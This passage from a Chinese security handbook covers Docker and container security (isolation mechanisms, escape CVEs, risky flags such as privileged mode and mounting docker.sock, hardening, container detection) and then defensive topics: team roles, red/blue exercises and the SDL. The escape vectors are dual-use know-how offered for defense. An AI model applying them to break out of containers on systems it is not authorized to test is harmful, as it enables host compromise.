系列笔记</span></a></li><li><a href='https://xz.aliyun.com/t/4191'><span>渗透利器 Cobalt Strike 第 2 篇 APT 级的全面免杀与企业纵深防御体系的对抗</span></a></li></ul></li></ol><p><span id="_bookmark60" class="anchor"></span><span>CHAPTER 7</span></p><p><span>云安全</span></p><ol start='' ><li><h2 id='容器标准'><span>容器标准</span></h2><ol start='' ><li><h3 id='oci'><span>OCI</span></h3></li></ol></li></ol><blockquote><p><span>开放容器标准 (Open Container Initiative, OCI) 是用于规范容器格式和运行时行业标准。目前 OCI 提出的规范有：</span></p></blockquote><ul><li><a href='https://github.com/opencontainers/runtime-spec'><span>OCI Runtime Specification</span></a></li><li><a href='https://github.com/opencontainers/image-spec'><span>OCI Image Format</span></a></li><li><a href='https://github.com/opencontainers/distribution-spec'><span>OCI Distribution Specification</span></a></li></ul><h3 id='cri'><span>CRI</span></h3><blockquote><p><span>容器运行时 (Container Runtime Interface, CRI) 定义了容器和镜像的接口，目前官方支持的容器运行时包括 Docker、Containerd、CRI-O 和 frakti。</span></p></blockquote><h3 id='参考链接-参考链接-1'><span>参考链接 {#参考链接}</span></h3><h4 id='文档-1'><span>文档</span></h4><ul><li><a href='https://kubernetes.io/blog/2016/12/container-runtime-interface-cri-in-kubernetes/'><span>Introducing Container Runtime Interface (CRI) in Kubernetes</span></a></li><li><a href='https://cri-o.io/'><span>cri-o</span></a></li></ul><h4 id='实现'><span>实现</span></h4><ul><li><a href='https://github.com/opencontainers/runc'><span>runc</span></a><span> OCI Runtime 的参考实现</span></li><li><a href='https://github.com/kata-containers/kata-containers'><span>Kata Containers</span></a><span> 提供高性能的硬件虚拟化容器运行时</span></li><li><a href='https://github.com/google/gvisor'><span>gvisor</span></a><span> Go 实现的基于用户态内核的容器运行时</span></li><li><a href='https://github.com/moby/buildkit'><span>buildkit</span></a><span> docker build 拆分出来的 build 项目</span></li></ul><ol start='2' ><li><h2 id='docker-1'><span>Docker</span></h2><ol start='' ><li><h3 id='虚拟化技术与容器技术'><span>虚拟化技术与容器技术</span></h3></li></ol></li></ol><h4 id='传统虚拟化技术'><span>传统虚拟化技术</span></h4><blockquote><p><span>传统虚拟化技术通过添加 hypervisor 层，虚拟出网卡，内存，CPU 等虚拟硬件，再在其上建立客户机，每个客户机都有自己的系统内核。传统虚拟化技术以虚拟机为管理单元，各虚拟机拥有独立的操作系统内核，不共用宿主机的软件系统资源，因此具有良好的隔离性，适用于云计算环境中的多租户场景。</span></p></blockquote><h4 id='容器技术'><span>容器技术</span></h4><blockquote><p><span>容器技术可以看作一种轻量级的虚拟化方式，容器技术在操作系统层进行虚拟化，可在宿主机内核上运行多个虚拟化环境。相比于传统的应用测试与部署，容器的部署无需预先考虑应用的运行环境兼容性问题；相比于传统虚拟机，容器无需独立的操作系统内核就可在宿主机中运行，实现了更高的运行效率与资源利用率。</span></p></blockquote><h3 id='docker-2'><span>Docker</span></h3><blockquote><p><span>Docker 是目前最具代表性的容器平台之一，具有持续部署与测试、跨云平台支持等优点。在基于 Kubernetes等容器编排工具实现的容器云环境中，通过对跨主机集群资源的调度，容器云可提供资源共享与隔离、容器编排与部署、应用支撑等功能。</span></p></blockquote><h4 id='基本概念-2'><span>基本概念</span></h4><blockquote><p><span>Docker 有三个基本概念，镜像（Image）、容器（Container）、仓库（Repository）。镜像是一个只读的模版，由一组文件系统通过 Union FS 技术组成。</span></p><p><span>镜像是静态的定义，容器是从镜像创建的运行实例。容器的本质是进程，拥有自己独立的命名空间。仓库（Repository）是集中存放镜像文件的场所，用于存储、分发镜像。</span></p><p><span>容器可以被启动、开始、停止、删除，每个容器都是相互隔离的，可以把容器看做是一个简易版的 Linux 环境（包括 root 用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</span></p></blockquote><h4 id='组成'><span>组成</span></h4><blockquote><p><span>Docker 引擎由如下主要组件构成：Docker 客户端（Docker Client）、Docker 守护进程（Docker daemon）、 containerd 以及 RunC，它们共同负责容器的创建和运行。</span></p><p><span>Docker Client 是和 Docker Daemon 建立通信客户端，Docker Client 可以通过 http/unix socket 等方式</span></p><p><span>Daemon 建立通信。</span></p><p><span>Docker Daemon 是容器管理的守护进程，在宿主机运行，作为服务端接受来自客户端的请求，主要功能包括镜像管理、镜像构建、REST API、身份验证、安全、核心网络以及编排。Docker daemon 通过位于 /var/ run/docker.sock 的本地 IPC/Unix socket 来实现 Docker 远程 API，默认非 TLS 网络端口为 2375，TLS默认端口为 2376。</span></p><p><span>containerd 是容器技术标准化之后出现的，用于将容器运行时从 Docker Daemon 剥离。containerd 主要职责是镜像管理、容器执行。</span></p><p><span>RunC 是 Docker 按照 OCF 标准制定的一种具体实现，实现了容器启动与停止、资源隔离等功能。</span></p></blockquote><h4 id='数据'><span>数据</span></h4><blockquote><p><span>Docker 的数据主要分为持久化和非持久化数据，默认情况下非持久化存储是自动创建生命周期与容器相同，删除容器也会删除非持久化数据，在 Linux 环境下，非持久化数据默认存储于 /var/lib/docker/ 下。</span></p></blockquote><h4 id='网络-1'><span>网络</span></h4><blockquote><p><span>Docker 网络架构源自一种叫作容器网络模型的方案，主要由 CNM、Libnetwork、网络驱动构程。</span></p></blockquote><h3 id='安全风险与安全机制'><span>安全风险与安全机制</span></h3><blockquote><p><span>在考虑 Docker 安全性的时候主要考虑以下几点</span></p></blockquote><ul><li><span>内核本身的安全性及其对命名空间和 cgroups 的支持</span></li><li><span>Docker 守护进程本身的攻击面</span></li><li><span>内核的</span>“<span>强化</span>”<span>安全功能以及它们如何与容器进行交互</span></li></ul><h4 id='docker-安全基线'><span>Docker 安全基线</span></h4><p><img src="media/image5.jpeg" referrerpolicy="no-referrer"></p><blockquote><p><strong><span>内核命名空间/namespace</span></strong></p><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>Docker 容器与 LXC 容器非常相似，并 具有相似的安全特性。当使用 docker 运行启动容器时，Docker 会在后台为容器创建一组命名空间和控制组。</span></p><p><span>命名空间提供了一个最直接的隔离形式：在容器中运行的进程看不到或者无法影响在另一个容器或主机系统中运行的进程。</span></p><p><span>每个容器也有自己的网络堆栈，这意味着一个容器不能获得对另一个容器的套接字或接口的特权访问。当然，如果主机系统相应设置，容器可以通过各自的网络接口交互。如果为容器指定公共端口或使用链接时，容器之间允许 IP 通信。</span></p><p><span>它们可以相互 ping 通，发送/接收 UDP 数据包，并建立 TCP 连接，但是如果需要可以限制它们。从网络体系结构的角度来看，给定 Docker 主机上的所有容器都位于网桥接口上。这意味着它们就像通过普通的以太网交换机连接的物理机器一样。</span></p></blockquote><h4 id='control-group'><span>Control Group</span></h4><blockquote><p><span>控制组是 Linux 容器的另一个关键组件，主要作用是实施资源核算和限制。</span></p><p><span>Cgroup 提供了许多有用的度量标准，但也有助于确保每个容器都能获得公平的内存，CPU 和磁盘 I/O; 更重要的是单个容器不能通过耗尽资源的方式来降低系统的性能。</span></p><p><span>因此，尽管 Cgroup 不能阻止一个容器访问或影响另一个容器的数据和进程，但它们对于抵御一些拒绝服务攻击是至关重要的。它们对于多租户平台尤其重要，例如公共和私人 PaaS，即使在某些应用程序开始行为不当时也能保证一致的正常运行时间（和性能）。</span></p></blockquote><h4 id='守护进程的攻击面'><span>守护进程的攻击面</span></h4><blockquote><p><span>使用 Docker 运行容器意味着运行 Docker 守护进程，而这个守护进程当前需要 root 权限，因此，守护进程是需要考虑的一个地方。</span></p><p><span>首先，只有受信任的用户才能被允许控制 Docker 守护进程。具体来说，Docker 允许您在 Docker 主机和访客容器之间共享一个目录; 它允许你这样做而不限制容器的访问权限。这意味着可以启动一个容器，其中/host目录将成为主机上的/目录，容器将能够不受任何限制地改变主机文件系统。</span></p><p><span>这具有很强的安全意义：例如，如果通过 Web 服务器测试 Docker 以通过 API 配置容器，则应该更加仔细地进行参数检查，以确保恶意用户无法传递制作的参数，从而导致 Docker 创建任意容器。</span></p><p><span>守护进程也可能容易受到其他输入的影响，例如从具有 docker 负载的磁盘或从具有 docker pull 的网络加载映像。</span></p><p><span>最终，预计 Docker 守护进程将运行受限特权，将操作委托给审核良好的子进程，每个子进程都有自己的（非常有限的）Linux 功能范围，虚拟网络设置，文件系统管理等。也就是说，很可能，Docker 引擎本身的部分将在容器中运行。</span></p></blockquote><h4 id='capability'><span>Capability</span></h4><blockquote><p><span>默认情况下，Docker 采用 Capability 机制来实现用户在以 root 身份运行容器的同时，限制部分 root 的操作。</span></p><p><span>在大多数情况下，容器不需要真正的 root 权限。因此，Docker 可以运行一个 Capability 较低的集合，这意味着容器中的 root 比真正的 root 要少得多。例如：</span></p></blockquote><ul><li><span>否认所有挂载操作</span></li><li><span>拒绝访问原始套接字（防止数据包欺骗）</span></li><li><span>拒绝访问某些文件系统操作，如创建新的设备节点，更改文件的所有者或修改属性（包括不可变标志）</span></li><li><span>拒绝模块加载</span></li><li><span>其他</span></li></ul><blockquote><p><span>这意味着，即使入侵者在容器内获取 root 权限，进一步攻击也会困难很多。默认情况下，Docker 使用白名单而不是黑名单，去除了所有非必要的功能。</span></p></blockquote><h4 id='seccomp'><span>Seccomp</span></h4><blockquote><p><span>Docker 使用 Seccomp 来限制容器对宿主机内核发起的系统调用。</span></p></blockquote><h3 id='攻击面分析'><span>攻击面分析</span></h3><h4 id='供应链安全-1'><span>供应链安全</span></h4><blockquote><p><span>在构建 Dockerfile 的过程中，即使是使用排名靠前的来源，也可能存在 CVE 漏洞、后门、镜像被污染、镜像中的依赖库存在漏洞等问题。</span></p></blockquote><h4 id='虚拟化风险'><span>虚拟化风险</span></h4><blockquote><p><span>虽然 Docker 通过命名空间进行了文件系统资源的基本隔离，但仍有 /sys 、/proc/sys 、/proc/bus 、/dev</span></p><p><span>、time 、syslog 等重要系统文件目录和命名空间信息未实现隔离，而是与宿主机共享相关资源。</span></p></blockquote><h4 id='利用内核漏洞逃逸'><span>利用内核漏洞逃逸</span></h4><ul><li><span>CVE-2016-5195</span></li></ul><h4 id='容器逃逸漏洞'><span>容器逃逸漏洞</span></h4><ul><li><p><span>CVE-2021-41091</span></p></li><li><p><span>CVE-2019-14271 Docker cp</span></p></li><li><p><span>CVE-2019-13139 Docker build code execution</span></p></li><li><h4 id='cve-2019-5736-runc'><span>CVE-2019-5736 runC</span></h4><ul><li><span>Docker Version </span><span>&lt;</span><span> 18.09.2</span></li><li><span>Version </span><span>&lt;</span><span>= 1.0-rc6</span></li></ul></li><li><p><span>CVE-2018-18955</span></p></li></ul><h4 id='配置不当'><span>配置不当</span></h4><ul><li><p><span>开启 privileged</span></p></li><li><p><span>挂载宿主机敏感目录</span></p></li><li><h4 id='配置-cap-不当'><span>配置 cap 不当</span></h4><ul><li><span>-</span><span>-cap-add=SYS_ADMIN</span></li></ul></li><li><h4 id='绕过-namespace'><span>绕过 namespace</span></h4><ul><li><span>-</span><span>-net=host</span></li><li><span>-</span><span>-pid=host</span></li><li><span>-</span><span>-ipc=host</span></li></ul></li></ul><h4 id='拒绝服务-2'><span>拒绝服务</span></h4><ul><li><span>CPU 耗尽</span></li><li><span>内存耗尽</span></li><li><span>存储耗尽</span></li><li><span>网络资源耗尽</span></li></ul><h4 id='危险挂载'><span>危险挂载</span></h4><ul><li><span>挂载 /var/run/docker.sock</span></li><li><span>挂载宿主机 /dev /proc 等危险目录</span></li></ul><h4 id='攻击-docker-守护进程'><span>攻击 Docker 守护进程</span></h4><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>虽然 Docker 容器具有很强的安全保护措施，但是 Docker 守护进程本身并没有被完善的保护。Docker 守护进程本身默认由 root 用户运行，并 该进程本身并没有使用 Seccomp 或者 AppArmor 等安全模块进行保护。这使得一旦攻击者成功找到漏洞控制 Docker 守护进程进行任意文件写或者代码执行，就可以顺利获得宿主机的 root 权限而不会受到各种安全机制的阻碍。值得一提的是，默认情况下 Docker 不会开启 User Namespace 隔离，这也意味着 Docker 内部的 root 与宿主机 root 对文件的读写权限相同。这导致一旦容器内部 root 进程获取读写宿主机文件的机会，文件权限将不会成为另一个问题。这一点在 CVE-2019-5636 利用中有所体现。</span></p></blockquote><h4 id='其他-cve'><span>其他 CVE</span></h4><ul><li><p><span>CVE-2014-5277</span></p></li><li><p><span>CVE-2014-6408</span></p></li><li><p><span>CVE-2014-9357</span></p></li><li><p><span>CVE-2014-9358</span></p></li><li><p><span>CVE-2015-3627</span></p></li><li><p><span>CVE-2015-3630</span></p><ol start='' ><li><h3 id='安全加固-1'><span>安全加固</span></h3><ul><li><h4 id='最小安装'><span>最小安装</span></h4><ul><li><span>删除所有开发工具（编译器等）</span></li></ul></li><li><p><span>更新系统源</span></p></li><li><p><span>启用 AppArmor</span></p></li><li><p><span>启用 SELinux</span></p></li><li><p><span>限制运行容器的内核功能</span></p></li><li><p><span>移除依赖构建</span></p></li><li><p><span>配置严格的网络访问控制策略</span></p></li><li><p><span>不使用 root 用户启动 docker</span></p></li><li><p><span>不以 privileged 特权模式运行容器</span></p></li><li><h4 id='控制资源'><span>控制资源</span></h4><ul><li><span>CPU Share</span></li><li><span>CPU 核数</span></li><li><span>内存资源</span></li><li><span>IO 资源</span></li><li><span>磁盘资源</span></li><li><span>硬件资源</span></li><li><span>单位时间内进程数量上限</span></li></ul></li><li><p><span>使用安全的基础镜像</span></p></li><li><p><span>定期安全扫描和更新补丁</span></p></li><li><h4 id='删除镜像中的-setuid-和-setgid-权限'><span>删除镜像中的 setuid 和 setgid 权限</span></h4><ul><li><span>RUN find / -perm +6000-type f-exec chmod a-s {} </span><span>\</span><span>;</span><span>|</span><span>|</span><span> true</span></li></ul></li><li><p><span>配置 Docker 守护程序的 TLS 身份验证</span></p></li><li><p><span>如非必要禁止容器间通信</span></p></li><li><h4 id='rootless-docker'><span>rootless Docker</span></h4><ul><li><a href='https://get.docker.com/rootless' target='_blank' class='url'>https://get.docker.com/rootless</a></li></ul></li><li><p><span>使用 Seccomp 限制 syscall</span></p></li><li><p><span>构建环境和在线环境分开</span></p></li><li><p><span>证书校验</span></p></li></ul></li><li><h3 id='docker-环境识别'><span>Docker 环境识别</span></h3></li></ol></li></ul><h4 id='docker-内'><span>Docker 内</span></h4><ul><li><span>MAC 地址为 02:42:ac:11:00:00 - 02:42:ac:11:ff:ff</span></li><li><span>ps aux 大部分运行的程序 pid 都很小</span></li><li><span>cat /proc/1/cgroup docker 的进程</span></li><li><span>docker 环境下存在 .dockerenv</span></li><li><span>部分容器中缺少许多常用的命令如 ping 等</span></li></ul><h4 id='docker-外'><span>Docker 外</span></h4><ul><li><span>/var/run/docker.sock 文件存在</span></li><li><span>2375 / 2376 端口开启</span></li></ul><ol start='3' ><li><h3 id='参考链接-参考链接-34'><span>参考链接 {#参考链接-34}</span></h3><ul><li><a href='https://blog.heroku.com/exploration-of-security-when-building-docker-containers'><span>A House of Cards An Exploration of Security When Building Docker Containers</span></a></li><li><a href='http://obrown.io/2016/02/15/privileged-containers.html'><span>Privileged Docker Containers</span></a></li><li><a href='https://kitctf.de/writeups/32c3ctf/docker'><span>32c3 docker writeup</span></a></li><li><a href='https://blog.qiniu.com/archives/7743'><span>打造安全的容器云平台</span></a></li><li><a href='https://docs.docker.com/engine/security/security/'><span>Docker security</span></a></li><li><a href='http://blog.nsfocus.net/docker-mirror-security/'><span>容器安全</span></a></li><li><a href='https://strm.sh/post/abusing-insecure-docker-deployments/'><span>CVE-2017-7494 Docker 沙箱逃逸</span></a></li><li><a href='https://www.freebuf.com/articles/system/221319.html'><span>Docker 容器安全性分析</span></a></li><li><a href='https://docs.docker.com/engine/security/apparmor/'><span>AppArmor security profiles for Docker</span></a></li><li><a href='https://github.com/docker/docker-bench-security'><span>Docker Bench for Security</span></a></li><li><a href='https://mp.weixin.qq.com/s/d9D3z13uCOJoJzplpu3WJQ'><span>Docker 安全性与攻击面分析</span></a></li><li><span>Pfleeger C P , Pfleeger S L , Theofanos M F . A methodology for penetration testing</span><span>[</span><span>J</span><span>]</span><span>. Computers &amp; Security, 1989, 8(7):613-620.</span></li></ul></li></ol><p>&nbsp;</p><ol start='' ><li><h2 id='参考链接-参考链接-35'><span>参考链接 {#参考链接-35}</span></h2><ol start='' ><li><h3 id='文档-2'><span>文档</span></h3><ul><li><a href='https://kubernetes.io/docs/home/'><span>Kubernetes Documentation</span></a></li><li><a href='https://wiki.openstack.org/wiki/Main_Page'><span>Openstack wiki</span></a></li><li><a href='https://www.nsa.gov/News-Features/Feature-Stories/Article-View/Article/2716980/nsa-cisa-release-kubernetes-hardening-guidance/'><span>NSA, CISA release Kubernetes Hardening Guidance</span></a></li><li><a href='https://github.com/rootsongjc/kubernetes-hardening-guidance'><span>Kubernetes Hardening Guidance</span></a><span> Kubernetes 加固手册</span></li></ul></li><li><h3 id='元数据安全'><span>元数据安全</span></h3><ul><li><a href='https://notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/'><span>Exploiting SSRF in AWS Elastic Beanstalk</span></a></li></ul></li><li><h3 id='云存储'><span>云存储</span></h3><ul><li><a href='https://github.com/ceph/ceph'><span>ceph</span></a></li><li><a href='https://tracker.ceph.com/'><span>ceph tracker</span></a></li></ul></li></ol></li></ol><p><span>CHAPTER 8</span></p><p><span>防御技术</span></p><ol start='' ><li><h2 id='团队建设'><span>团队建设</span></h2><ol start='' ><li><h3 id='人员分工'><span>人员分工</span></h3><ul><li><h4 id='部门负责人'><span>部门负责人</span></h4><ul><li><span>负责组织整体的信息安全规划</span></li><li><span>负责向高层沟通申请资源</span></li><li><span>负责与组织其他部门的协调沟通</span></li><li><span>共同推进信息安全工作</span></li><li><span>负责信息安全团队建设</span></li><li><span>负责安全事件应急工作处置</span></li><li><span>负责推动组织安全规划的落实</span></li></ul></li><li><h4 id='合规管理员'><span>合规管理员</span></h4><ul><li><span>负责安全相关管理制度、管理流程的制定，监督实施情况，修改和改进相关的制度和流程</span></li><li><span>负责合规性迎检准备工作，包括联络、迎检工作推动，迎检结果汇报等所有相关工作</span></li><li><span>负责与外部安全相关单位联络</span></li><li><span>负责安全意识培训、宣传和推广</span></li></ul></li><li><h4 id='安全技术负责人'><span>安全技术负责人</span></h4><ul><li><span>业务安全防护整体技术规划和计划</span></li><li><span>了解组织安全技术缺陷，并能找到方法进行防御</span></li><li><span>安全设备运维</span></li><li><span>服务器与网络基础设备的安全加固推进工作</span></li><li><span>安全事件排查与分析，配合定期编写安全分析报告</span></li><li><span>关注注业内安全事件，跟踪最新漏洞信息，进行业务产品的安全检查</span></li><li><span>负责漏洞修复工作推进，跟踪解决情况，问题收集</span></li><li><span>了解最新安全技术趋势</span></li></ul></li><li><h4 id='mediaimage4pngwidth013194444444444445in-height013194444444444445in透代码审计人员'><img src="media/image4.png" referrerpolicy="no-referrer"><span>透/代码审计人员</span></h4><ul><li><span>对组织业务网站、业务系统进行安全评估测试</span></li><li><span>对漏洞结果提供解决方案和修复建议</span></li></ul></li><li><h4 id='安全设备运维人员'><span>安全设备运维人员</span></h4><ul><li><span>负责设备配置和策略的修改</span></li><li><span>负责协助其他部门的变更导致的安全策略修改的实现</span></li></ul></li><li><h4 id='安全开发-1'><span>安全开发</span></h4><ul><li><span>根据组织安全的需要开发安全辅助工具或平台</span></li><li><span>参与安全系统的需求分析、设计、编码等开发工作</span></li><li><span>维护公司现有的安全程序与系统</span></li></ul></li></ul></li><li><h3 id='参考链接-参考链接-2'><span>参考链接 {#参考链接}</span></h3><ul><li><a href='https://mp.weixin.qq.com/s/BqOFP217kiN55IWb_oQP-w'><span>初入甲方的企业安全建设规划</span></a></li><li><a href='https://mp.weixin.qq.com/s/RlBTH9-xrY7Nd1ZJK3KjDQ'><span>企业安全项目架构实践分享</span></a></li><li><a href='https://xz.aliyun.com/t/1965'><span>企业信息安全团队建设</span></a></li></ul></li></ol></li><li><h2 id='红蓝对抗-1'><span>红蓝对抗</span></h2><ol start='' ><li><h3 id='概念-1'><span>概念</span></h3></li></ol></li></ol><blockquote><p><span>红蓝对抗的概念最早来源于 20 世纪 60 年代的美国演习，演习是专指军队进行大规模的实兵演习，演习中通常分为红军、蓝军，其中蓝军通常是指在部队模拟对抗演习专门扮演假想敌的部队，与红军 (代表我方正面部队) 进行针对性的训练，这种方式也被称作 Red Teaming。</span></p><p><span>网络安全红蓝对抗的概念就源自于此。红军作为企业防守方，通过安全加固、攻击监测、应急处置等手段来保障企业安全。而蓝军作为攻击方，以发现安全漏洞，获取业务权限或数据为目标，利用各种攻击手段，试图绕过红军层层防护，达成既定目标。可能会造成混淆的是，在欧美一般采用红队代表攻击方，蓝队代表防守方，颜色代表正好相反。</span></p></blockquote><h3 id='网络攻防演习'><span>网络攻防演习</span></h3><blockquote><p><span>比较有影响力的演习有</span>“<span>锁盾</span>”<span>(Locked Shields)、</span>“<span>网络风暴</span>”<span>等。其中</span>“<span>锁盾</span>”<span>由北约卓越网络防御合作中心 (CCDCOE，Cooperative Cyber Defence Centre of Excellence) 每年举办一次。</span>“<span>网络风暴</span>”<span>由美国国土安全部 (DHS) 主导，2006 年开始，每两年举行一次。</span></p><p><span>和 APT 攻击相比，攻防演习相对时长较短，只有 1</span><span>~</span><span>4 周，有个防守目标。而 APT 攻击目标唯一，时长可达数月至数年，更有隐蔽性。</span></p></blockquote><h3 id='侧重'><span>侧重</span></h3><blockquote><p><span>企业网络蓝军工作内容主要包括渗透测试和红蓝对抗，这两种方式所使用的技术基本相同，但是侧重点不同。</span></p><p><span>渗透测试侧重用较短的时间去挖掘更多的安全漏洞，一般不太关注攻击行为是否被监测发现，目的是帮助业务系统暴露和收敛更多风险。</span></p><p><span>红蓝对抗更接近真实场景，偏向于实战，面对的场景复杂、技术繁多。侧重绕过防御体系，毫无声息达成获取业务权限或数据的目标。不求发现全部风险点，因为攻击动作越多被发现的概率越大，一旦被发现，红军就会把蓝军踢出战场。红蓝对抗的目的是检验在真实攻击中纵深防御能力、告警运营质量、应急处置能力。</span></p></blockquote><ol start='4' ><li><h3 id='目标'><span>目标</span></h3><ul><li><span>评估现有防御能力的有效性、识别防御体系的弱点并提出具体的应对方案</span></li><li><span>利用真实有效的模拟攻击来评估因为安全问题所造成的潜在的业务影响，为安全管理提供有效的数据来量化安全投入的 ROI</span></li><li><span>提高公司安全成熟度及其检测和响应攻击的能力</span></li></ul></li><li><h3 id='前期准备'><span>前期准备</span></h3><ul><li><p><span>组织结构图</span></p></li><li><p><span>全网拓扑图</span></p></li><li><p><span>各系统逻辑结构图</span></p></li><li><p><span>各系统之间的调用关系</span></p></li><li><p><span>数据流关系</span></p></li><li><h4 id='资产梳理'><span>资产梳理</span></h4><ul><li><span>核心资产清单</span></li><li><span>业务系统资产</span></li><li><span>设备资产</span></li><li><span>外包/第三方服务资产</span></li><li><span>历史遗留资产</span></li></ul></li><li><h4 id='业务资产信息'><span>业务资产信息</span></h4><ul><li><span>业务系统名称</span></li><li><span>业务系统类型</span></li><li><span>服务器类型</span></li><li><span>域名/IP 地址</span></li><li><span>服务端口</span></li><li><span>版本</span></li><li><span>系统部署位置</span></li><li><span>开发框架</span></li><li><span>中间件</span></li><li><span>数据库</span></li><li><span>责任人</span></li><li><span>维护人员</span></li></ul></li><li><h4 id='设备资产信息'><span>设备资产信息</span></h4><ul><li><span>设备名称</span></li><li><span>设备版本号</span></li><li><span>固件版本号</span></li><li><span>IP 地址</span></li><li><span>部署位置</span></li><li><span>责任人</span></li><li><span>维护人员</span></li></ul></li><li><h4 id='外包第三方服务资产信息'><span>外包/第三方服务资产信息</span></h4><ul><li><span>厂商联系方式</span></li><li><span>系统名称</span></li><li><span>系统类型</span></li><li><span>IP/URL 地址</span></li><li><span>部署位置</span></li><li><span>责任人</span></li><li><span>维护人员</span></li><li><span>厂商联系方式</span></li><li><span>第三方值班人员</span></li></ul></li><li><h4 id='风险梳理'><span>风险梳理</span></h4><ul><li><span>基础设施风险</span></li><li><span>帐号权限梳理</span></li><li><span>互联网风险排查</span></li><li><span>收敛攻击面</span></li></ul></li><li><p><span>应急响应计划</span></p></li><li><p><span>业务连续性计划</span></p></li><li><p><span>灾难恢复计划</span></p></li></ul></li><li><h3 id='行动流程'><span>行动流程</span></h3><ul><li><h4 id='攻击准备'><span>攻击准备</span></h4><ul><li><span>明确授权范围、测试目标、限制条件等</span></li><li><span>报备与授权流程</span></li><li><span>行动成本与预算</span></li></ul></li><li><h4 id='攻击执行'><span>攻击执行</span></h4><ul><li><span>备案的时间区间内</span></li><li><span>备案的目标范围内</span></li><li><span>备案的攻击 IP 与网络环境</span></li></ul></li><li><h4 id='攻击完成'><span>攻击完成</span></h4><ul><li><span>恢复所有修改</span></li><li><span>移除所有持久化控制</span></li><li><span>提交攻击报告与改进建议</span></li></ul></li></ul></li><li><h3 id='注意事项'><span>注意事项</span></h3><ul><li><span>测试前进行报备</span></li><li><span>有可能会影响到业务的操作时候提前沟通</span></li><li><span>漏洞和业务沟通确认后再发工单修复</span></li><li><span>漏洞闭环</span></li></ul></li><li><h3 id='参考链接-参考链接-36'><span>参考链接 {#参考链接-36}</span></h3><ul><li><a href='https://mp.weixin.qq.com/s/8iJs2ON66NY1Jdbt7c-BTA'><span>以攻促防企业蓝军建设思考</span></a></li><li><a href='http://avfisher.win/archives/1175'><span>云上攻防：Red Teaming for Cloud</span></a></li><li><a href='https://www.freebuf.com/articles/neopoints/252229.html'><span>网络攻防演练之企业蓝队建设指南</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='3' ><li><h2 id='安全开发-2'><span>安全开发</span></h2><ol start='' ><li><h3 id='简介-34'><span>简介</span></h3></li></ol></li></ol><blockquote><p><span>安全开发生命周期（Security Development Lifecycle，SDL）是微软提出的从安全的角度来指导软件开发过程的管理模式。用于帮助开发人员构建更安全的软件、解决安全合规要求，并降低开发成本。</span></p></blockquote><h3 id='步骤'><span>步骤</span></h3><h4 id='阶段-1培训'><span>阶段 1：培训</span></h4><blockquote><p><span>开发团队的所有成员都必须接受适当的安全培训，了解相关的安全知识。培训对象包括开发人员、测试人员、项目经理、产品经理等。</span></p></blockquote><h4 id='阶段-2确定安全需求'><span>阶段 2：确定安全需求</span></h4><blockquote><p><span>在项目确立之前，需要提前确定安全方面的需求，确定项目的计划时间，尽可能避免安全引起的需求变更。</span></p></blockquote><h4 id='阶段-3设计'><span>阶段 3：设计</span></h4><blockquote><p><span>在设计阶段确定安全的最低可接受级别。考虑项目涉及到哪些攻击面、是否能减小攻击面。</span></p><p><span>对项目进行威胁建模，明确可能来自的攻击有哪些方面，并考虑项目哪些部分需要进行渗透测试。</span></p></blockquote><h4 id='阶段-4实现'><span>阶段 4：实现</span></h4><blockquote><p><span>实现阶段主要涉及到工具、不安全的函数、静态分析等方面。</span></p><p><span>工具方面主要考虑到开发团队使用的编辑器、链接器等相关工具可能会涉及一些安全相关的问题，因此在使用工具的版本上，需要提前与安全团队进行沟通。</span></p><p><span>函数方面主要考虑到许多常用函数可能存在安全隐患，应当禁用不安全的函数和 API，使用安全团队推荐的函数。</span></p><p><span>代码静态分析可以由相关工具辅助完成，其结果与人工分析相结合。</span></p></blockquote><h4 id='阶段-5验证'><span>阶段 5：验证</span></h4><blockquote><p><span>验证阶段涉及到动态程序分析和攻击面再审计。动态分析对静态分析进行补充，常用的方式是模糊测试、渗透测试。模糊测试通过向应用程序引入特定格式或随机数据查找程序可能的问题。</span></p><p><span>考虑到项目经常会因为需求变更等情况使得最终产品和初期目标不一致，因此需要在项目后期再次对威胁模型和攻击面进行分析和考虑，如果出现问题则进行纠正。</span></p></blockquote><h4 id='阶段-6发布'><span>阶段 6：发布</span></h4><blockquote><p><span>在程序发布后，需要对安全事件进行响应，需要预设好遇到安全问题时的处理方式。 另外如果产品中包含第三方的代码，也需要考虑如何响应因为第三方依赖引入的问题。</span></p></blockquote><ol start='3' ><li><h3 id='参考链接-参考链接-37'><span>参考链接 {#参考链接-37}</span></h3><ul><li><a href='https://www.microsoft.com/en-us/securityengineering/sdl/practices'><span>SDL Practices</span></a></li><li><a href='https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling'><span>Threat Modeling</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='4' ><li><h2 id='安全建设-1'><span>安全建设</span></h2><ol start='' ><li><h3 id='参考链接-参考链接-38'><span>参考链接 {#参考链接-38}</span></h3></li><li><p><strong><span>安全运营</span></strong></p><ul><li><a href='https://zhuanlan.zhihu.com/p/39467201'><span>我理解的安全运营 by 职业欠钱</span></a></li><li><a href='https://zhuanlan.zhihu.com/p/84591095'><span>再谈安全运营 by 职业欠钱</span></a></li><li><a href='https://mp.weixin.qq.com/s?__biz=MzIzMTAzNzUxMQ%3D%3D&amp;mid=2652893616&amp;idx=1&amp;sn=6738a4e33050ed084d1535196aec6061'><span>我们谈安全运营时在谈什么 by 聂君</span></a></li><li><a href='https://36kr.com/p/1721236635649'><span>金融行业企业安全运营之路 by 聂君</span></a></li><li><a href='https://mp.weixin.qq.com/s?__biz=MzI2MjQ1NTA4MA%3D%3D&amp;mid=2247485062&amp;idx=1&amp;sn=94c9fa40edef6de0ea46c453405e3687'><span>秦波：大型互联网应用安全 SDL 体系建设实践</span></a></li></ul></li></ol></li></ol><h4 id='安全建设-279'><span>安全建设 279</span></h4><ul><li><a href='https://mp.weixin.qq.com/s?__biz=MzI2MjQ1NTA4MA%3D%3D&amp;mid=2247485405&amp;idx=1&amp;sn=bda9283329f6db15d69d4cdf37c609d2'><span>谭晓生：论 CISO 的个人修养</span></a></li><li><a href='https://www.freebuf.com/articles/es/200024.html'><span>赵彦的 CISO 闪电战两年甲方安全修炼之路</span></a></li><li><a href='https://mp.weixin.qq.com/s?__biz=MzI2MjQ1NTA4MA%3D%3D&amp;mid=2247484735&amp;idx=1&amp;sn=02e06dd84ee0322dd2f9fe761b244013'><span>胡珀谈安全运营 by lake2</span></a></li><li><a 